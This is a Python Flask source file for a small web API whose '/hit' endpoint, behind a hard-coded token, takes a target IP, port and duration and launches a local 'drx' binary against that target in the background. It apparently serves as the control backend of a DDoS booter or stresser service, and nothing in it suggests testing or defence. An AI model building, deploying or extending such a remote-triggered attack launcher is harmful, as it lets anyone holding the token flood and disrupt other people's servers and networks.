from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)
API_AUTH_TOKEN = "DRX_POWER_ULTRA_V4"
DRX_PATH = os.path.join(os.getcwd(), 'drx')

@app.route('/hit', methods=['GET'])
def start_attack():
    token = request.args.get('token')
    if token != API_AUTH_TOKEN:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403
    
    target_ip = request.args.get('ip')
    target_port = request.args.get('port')
    duration = request.args.get('time', "240")
    
    if not target_ip or not target_port:
        return jsonify({"status": "error", "message": "Missing params"}), 400
    
    try:
        subprocess.Popen(
            [DRX_PATH, target_ip, target_port, duration],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return jsonify({"status": "success", "message": "Launched"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "alive"}), 200

if __name__ == '__main__':
    port = int(os.getenv('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
